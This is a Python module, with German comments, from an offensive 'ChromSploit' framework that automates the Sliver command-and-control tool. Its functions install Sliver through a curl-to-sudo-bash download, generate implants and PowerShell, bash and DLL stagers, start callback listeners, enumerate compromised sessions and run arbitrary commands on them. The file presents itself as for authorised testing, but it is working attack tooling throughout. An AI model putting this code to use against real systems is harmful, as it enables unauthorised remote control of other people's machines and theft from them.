#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ChromSploit Framework v2.0
Sliver C2 Framework Integration
Für Bildungs- und autorisierte Penetrationstests
"""

import os
import sys
import time
import json
import subprocess
import tempfile
from typing import Dict, List, Any, Optional, Tuple, Union

from core.colors import Colors
from core.logger import Logger
from core.utils import Utils
from core.path_utils import PathUtils

class SliverIntegration:
    """
    Integration des Sliver C2 Frameworks in ChromSploit
    """
    
    def __init__(self, logger: Optional[Logger] = None):
        """
        Initialisiert die Sliver-Integration
        
        Args:
            logger (Logger, optional): Logger-Instanz
        """
        self.logger = logger
        self.sliver_path = "/opt/sliver/sliver-server"
        self.sliver_client_path = "/opt/sliver/sliver-client"
        self.active_sessions = []
        self.active_listeners = []
        self.implants = []
    
    def log(self, level: str, message: str) -> None:
        """
        Loggt eine Nachricht
        
        Args:
            level (str): Log-Level
            message (str): Nachricht
        """
        if self.logger:
            if level == "info":
                self.logger.info(message)
            elif level == "warning":
                self.logger.warning(message)
            elif level == "error":
                self.logger.error(message)
            elif level == "debug":
                self.logger.debug(message)
        else:
            print(f"{Colors.BLUE}[*] {message}{Colors.RESET}" if level == "info" else
                  f"{Colors.YELLOW}[!] {message}{Colors.RESET}" if level == "warning" else
                  f"{Colors.RED}[-] {message}{Colors.RESET}" if level == "error" else
                  f"{Colors.MAGENTA}[D] {message}{Colors.RESET}")
    
    def is_available(self) -> bool:
        """
        Überprüft, ob Sliver verfügbar ist
        
        Returns:
            bool: True, wenn Sliver verfügbar ist, sonst False
        """
        return os.path.exists(self.sliver_path) or Utils.is_tool_available("sliver")
    
    def get_version(self) -> str:
        """
        Gibt die Sliver-Version zurück
        
        Returns:
            str: Die Sliver-Version oder "Unbekannt" bei Fehler
        """
        try:
            if os.path.exists(self.sliver_path):
                result = subprocess.run([self.sliver_path, "version"], 
                                     capture_output=True, text=True, timeout=10)
                return result.stdout.strip()
            elif Utils.is_tool_available("sliver"):
                result = subprocess.run(["sliver", "version"], 
                                     capture_output=True, text=True, timeout=10)
                return result.stdout.strip()
            return "Nicht verfügbar"
        except Exception as e:
            self.log("error", f"Fehler beim Abrufen der Sliver-Version: {str(e)}")
            return "Unbekannt"
    
    def install(self) -> bool:
        """
        Installiert Sliver, falls es nicht verfügbar ist
        
        Returns:
            bool: True bei erfolgreicher Installation, sonst False
        """
        if self.is_available():
            self.log("info", "Sliver ist bereits installiert")
            return True
        
        self.log("info", "Installiere Sliver C2 Framework...")
        
        try:
            # Sliver-Installationsscript herunterladen
            self.log("info", "Lade Sliver-Installationsscript herunter...")
            download_cmd = "curl -s https://sliver.sh/install | sudo bash"
            result = subprocess.run(download_cmd, shell=True, check=True, 
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # Überprüfen, ob die Installation erfolgreich war
            if self.is_available():
                self.log("info", "Sliver wurde erfolgreich installiert")
                return True
            else:
                self.log("error", "Sliver-Installation fehlgeschlagen")
                return False
        except Exception as e:
            self.log("error", f"Fehler bei der Sliver-Installation: {str(e)}")
            return False
    
    def generate_implant(self, 
                        target_os: str = "windows", 
                        arch: str = "amd64", 
                        format_type: str = "exe", 
                        c2_url: Optional[str] = None,
                        output_path: Optional[str] = None) -> Optional[str]:
        """
        Generiert einen Sliver-Implant
        
        Args:
            target_os (str, optional): Zielbetriebssystem (windows, linux, darwin)
            arch (str, optional): Zielarchitektur (amd64, 386, arm, arm64)
            format_type (str, optional): Ausgabeformat (exe, shared, shellcode, service)
            c2_url (str, optional): C2-Server-URL (z.B. https://example.com:8443)
            output_path (str, optional): Ausgabepfad für den Implant
            
        Returns:
            str: Pfad zum generierten Implant oder None bei Fehler
        """
        if not self.is_available():
            self.log("error", "Sliver ist nicht verfügbar")
            return None
        
        self.log("info", f"Generiere Sliver-Implant für {target_os}/{arch} im Format {format_type}...")
        
        # Befehl zum Generieren des Implants erstellen
        cmd = [self.sliver_path, "generate", 
              "--os", target_os, 
              "--arch", arch, 
              "--format", format_type]
        
        # C2-URL hinzufügen, falls angegeben
        if c2_url:
            if c2_url.startswith("https://"):
                cmd.extend(["--https", c2_url])
            elif c2_url.startswith("http://"):
                cmd.extend(["--http", c2_url])
            else:
                cmd.extend(["--mtls", c2_url])
        
        # Ausgabepfad festlegen
        if not output_path:
            output_dir = os.path.join(PathUtils.get_output_dir(), "sliver")
            PathUtils.ensure_dir_exists(output_dir)
            output_path = os.path.join(output_dir, f"sliver_implant_{target_os}_{arch}.{format_type}")
        
        cmd.extend(["--save", output_path])
        
        try:
            # Implant generieren
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                self.log("info", f"Sliver-Implant erfolgreich generiert: {output_path}")
                self.implants.append({
                    "path": output_path,
                    "os": target_os,
                    "arch": arch,
                    "format": format_type,
                    "c2_url": c2_url
                })
                return output_path
            else:
                self.log("error", f"Fehler beim Generieren des Sliver-Implants: {result.stderr}")
                return None
        except Exception as e:
            self.log("error", f"Fehler beim Generieren des Sliver-Implants: {str(e)}")
            return None
    
    def start_listener(self, 
                      protocol: str = "https", 
                      port: int = 8443, 
                      host: str = "0.0.0.0",
                      persistent: bool = True) -> bool:
        """
        Startet einen Sliver-Listener
        
        Args:
            protocol (str, optional): Protokoll (https, http, mtls, wg, dns)
            port (int, optional): Port
            host (str, optional): Host
            persistent (bool, optional): Ob der Listener persistent sein soll
            
        Returns:
            bool: True bei Erfolg, sonst False
        """
        if not self.is_available():
            self.log("error", "Sliver ist nicht verfügbar")
            return False
        
        self.log("info", f"Starte Sliver-Listener ({protocol}) auf {host}:{port}...")
        
        # Befehl zum Starten des Listeners erstellen
        cmd = [self.sliver_path]
        
        if protocol == "https":
            cmd.append("https")
        elif protocol == "http":
            cmd.append("http")
        elif protocol == "mtls":
            cmd.append("mtls")
        elif protocol == "dns":
            cmd.append("dns")
        else:
            self.log("error", f"Ungültiges Protokoll: {protocol}")
            return False
        
        cmd.extend(["--lhost", host, "--lport", str(port)])
        
        try:
            # Listener starten
            if persistent:
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(2)  # Kurz warten, um zu sehen, ob der Listener startet
                
                # Überprüfen, ob der Prozess noch läuft
                if process.poll() is None:
                    self.log("info", f"Sliver-Listener ({protocol}) erfolgreich gestartet auf {host}:{port}")
                    self.active_listeners.append({
                        "protocol": protocol,
                        "host": host,
                        "port": port,
                        "process": process
                    })
                    return True
                else:
                    stdout, stderr = process.communicate()
                    self.log("error", f"Fehler beim Starten des Sliver-Listeners: {stderr.decode()}")
                    return False
            else:
                result = subprocess.run(cmd, capture_output=True, text=True)
                
                if result.returncode == 0:
                    self.log("info", f"Sliver-Listener ({protocol}) erfolgreich gestartet auf {host}:{port}")
                    self.active_listeners.append({
                        "protocol": protocol,
                        "host": host,
                        "port": port
                    })
                    return True
                else:
                    self.log("error", f"Fehler beim Starten des Sliver-Listeners: {result.stderr}")
                    return False
        except Exception as e:
            self.log("error", f"Fehler beim Starten des Sliver-Listeners: {str(e)}")
            return False
    
    def stop_listener(self, protocol: str, port: int) -> bool:
        """
        Stoppt einen Sliver-Listener
        
        Args:
            protocol (str): Protokoll
            port (int): Port
            
        Returns:
            bool: True bei Erfolg, sonst False
        """
        for i, listener in enumerate(self.active_listeners):
            if listener["protocol"] == protocol and listener["port"] == port:
                if "process" in listener:
                    try:
                        listener["process"].terminate()
                        listener["process"].wait(timeout=5)
                        self.log("info", f"Sliver-Listener ({protocol}) auf Port {port} gestoppt")
                        self.active_listeners.pop(i)
                        return True
                    except Exception as e:
                        self.log("error", f"Fehler beim Stoppen des Sliver-Listeners: {str(e)}")
                        return False
                else:
                    self.log("warning", f"Kein Prozess für Listener ({protocol}) auf Port {port} gefunden")
                    self.active_listeners.pop(i)
                    return True
        
        self.log("warning", f"Kein aktiver Listener ({protocol}) auf Port {port} gefunden")
        return False
    
    def stop_all_listeners(self) -> bool:
        """
        Stoppt alle aktiven Sliver-Listener
        
        Returns:
            bool: True bei Erfolg, sonst False
        """
        success = True
        
        for listener in self.active_listeners[:]:
            if "process" in listener:
                try:
                    listener["process"].terminate()
                    listener["process"].wait(timeout=5)
                    self.log("info", f"Sliver-Listener ({listener['protocol']}) auf Port {listener['port']} gestoppt")
                except Exception as e:
                    self.log("error", f"Fehler beim Stoppen des Sliver-Listeners: {str(e)}")
                    success = False
        
        self.active_listeners = []
        return success
    
    def get_active_listeners(self) -> List[Dict[str, Any]]:
        """
        Gibt alle aktiven Sliver-Listener zurück
        
        Returns:
            list: Liste der aktiven Listener
        """
        # Aktualisieren der Listener-Liste, um zu überprüfen, ob alle noch aktiv sind
        for i, listener in enumerate(self.active_listeners[:]):
            if "process" in listener and listener["process"].poll() is not None:
                self.log("warning", f"Listener ({listener['protocol']}) auf Port {listener['port']} ist nicht mehr aktiv")
                self.active_listeners.pop(i)
        
        return self.active_listeners
    
    def get_active_sessions(self) -> List[Dict[str, Any]]:
        """
        Gibt alle aktiven Sliver-Sessions zurück
        
        Returns:
            list: Liste der aktiven Sessions
        """
        if not self.is_available():
            self.log("error", "Sliver ist nicht verfügbar")
            return []
        
        try:
            # Temporäre Datei für Sliver-Befehl erstellen
            with tempfile.NamedTemporaryFile(mode='w+', delete=False) as temp:
                temp.write("sessions\nexit\n")
                temp_path = temp.name
            
            # Sliver-Befehl ausführen
            cmd = [self.sliver_client_path, "-n"]
            
            process = subprocess.Popen(cmd, stdin=open(temp_path, 'r'), 
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            
            # Temporäre Datei löschen
            os.unlink(temp_path)
            
            # Sessions parsen
            sessions = []
            lines = stdout.split('\n')
            for line in lines:
                if "→" in line and "|" in line:
                    parts = line.split('|')
                    if len(parts) >= 5:
                        session_id = parts[0].strip()
                        transport = parts[1].strip()
                        remote_address = parts[2].strip()
                        hostname = parts[3].strip()
                        username = parts[4].strip()
                        
                        sessions.append({
                            "id": session_id,
                            "transport": transport,
                            "remote_address": remote_address,
                            "hostname": hostname,
                            "username": username
                        })
            
            self.active_sessions = sessions
            return sessions
        except Exception as e:
            self.log("error", f"Fehler beim Abrufen der Sliver-Sessions: {str(e)}")
            return []
    
    def execute_command(self, session_id: str, command: str) -> Tuple[bool, str]:
        """
        Führt einen Befehl in einer Sliver-Session aus
        
        Args:
            session_id (str): Session-ID
            command (str): Auszuführender Befehl
            
        Returns:
            tuple: (Erfolg, Ausgabe)
        """
        if not self.is_available():
            self.log("error", "Sliver ist nicht verfügbar")
            return False, "Sliver ist nicht verfügbar"
        
        try:
            # Temporäre Datei für Sliver-Befehl erstellen
            with tempfile.NamedTemporaryFile(mode='w+', delete=False) as temp:
                temp.write(f"use {session_id}\n{command}\nexit\n")
                temp_path = temp.name
            
            # Sliver-Befehl ausführen
            cmd = [self.sliver_client_path, "-n"]
            
            process = subprocess.Popen(cmd, stdin=open(temp_path, 'r'), 
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            
            # Temporäre Datei löschen
            os.unlink(temp_path)
            
            if process.returncode == 0:
                self.log("info", f"Befehl '{command}' erfolgreich in Session {session_id} ausgeführt")
                return True, stdout
            else:
                self.log("error", f"Fehler beim Ausführen des Befehls in Session {session_id}: {stderr}")
                return False, stderr
        except Exception as e:
            self.log("error", f"Fehler beim Ausführen des Befehls in Session {session_id}: {str(e)}")
            return False, str(e)
    
    def terminate_session(self, session_id: str) -> bool:
        """
        Beendet eine Sliver-Session
        
        Args:
            session_id (str): Session-ID
            
        Returns:
            bool: True bei Erfolg, sonst False
        """
        if not self.is_available():
            self.log("error", "Sliver ist nicht verfügbar")
            return False
        
        try:
            # Temporäre Datei für Sliver-Befehl erstellen
            with tempfile.NamedTemporaryFile(mode='w+', delete=False) as temp:
                temp.write(f"kill {session_id}\nexit\n")
                temp_path = temp.name
            
            # Sliver-Befehl ausführen
            cmd = [self.sliver_client_path, "-n"]
            
            process = subprocess.Popen(cmd, stdin=open(temp_path, 'r'), 
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            
            # Temporäre Datei löschen
            os.unlink(temp_path)
            
            if process.returncode == 0 and "killed" in stdout.lower():
                self.log("info", f"Session {session_id} erfolgreich beendet")
                
                # Session aus der Liste entfernen
                self.active_sessions = [s for s in self.active_sessions if s["id"] != session_id]
                
                return True
            else:
                self.log("error", f"Fehler beim Beenden der Session {session_id}: {stderr}")
                return False
        except Exception as e:
            self.log("error", f"Fehler beim Beenden der Session {session_id}: {str(e)}")
            return False
    
    def generate_stager(self, 
                       protocol: str = "https", 
                       host: str = "127.0.0.1", 
                       port: int = 8443,
                       format_type: str = "powershell",
                       output_path: Optional[str] = None) -> Optional[str]:
        """
        Generiert einen Sliver-Stager
        
        Args:
            protocol (str, optional): Protokoll (https, http, mtls)
            host (str, optional): Host
            port (int, optional): Port
            format_type (str, optional): Ausgabeformat (powershell, bash, dll)
            output_path (str, optional): Ausgabepfad für den Stager
            
        Returns:
            str: Pfad zum generierten Stager oder None bei Fehler
        """
        if not self.is_available():
            self.log("error", "Sliver ist nicht verfügbar")
            return None
        
        self.log("info", f"Generiere Sliver-Stager ({format_type}) für {protocol}://{host}:{port}...")
        
        # Befehl zum Generieren des Stagers erstellen
        cmd = [self.sliver_path, "generate", "stager"]
        
        if protocol == "https":
            cmd.extend(["--https", f"{host}:{port}"])
        elif protocol == "http":
            cmd.extend(["--http", f"{host}:{port}"])
        elif protocol == "mtls":
            cmd.extend(["--mtls", f"{host}:{port}"])
        else:
            self.log("error", f"Ungültiges Protokoll: {protocol}")
            return None
        
        cmd.extend(["--format", format_type])
        
        # Ausgabepfad festlegen
        if not output_path:
            output_dir = os.path.join(PathUtils.get_output_dir(), "sliver")
            PathUtils.ensure_dir_exists(output_dir)
            
            if format_type == "powershell":
                ext = "ps1"
            elif format_type == "bash":
                ext = "sh"
            elif format_type == "dll":
                ext = "dll"
            else:
                ext = "bin"
            
            output_path = os.path.join(output_dir, f"sliver_stager_{protocol}_{port}.{ext}")
        
        cmd.extend(["--save", output_path])
        
        try:
            # Stager generieren
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                self.log("info", f"Sliver-Stager erfolgreich generiert: {output_path}")
                return output_path
            else:
                self.log("error", f"Fehler beim Generieren des Sliver-Stagers: {result.stderr}")
                return None
        except Exception as e:
            self.log("error", f"Fehler beim Generieren des Sliver-Stagers: {str(e)}")
            return None
